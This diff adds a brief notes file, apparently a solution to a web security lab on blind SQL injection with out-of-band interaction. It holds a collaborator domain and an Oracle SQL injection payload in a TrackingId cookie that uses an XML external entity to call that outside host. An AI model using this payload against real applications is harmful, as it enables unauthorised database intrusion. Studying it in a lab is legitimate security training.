@@ -1,0 +1,6 @@
+# Blind SQL injection with out-of-band interaction
+
+1wy4mkxtqg1e3nq19bv5bouf56byzond.oastify.com
+
+
+TrackingId=Qxnp0taw95pdZ3kP' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://1wy4mkxtqg1e3nq19bv5bouf56byzond.oastify.com/"> %remote;]>'),'/l') FROM dual)--
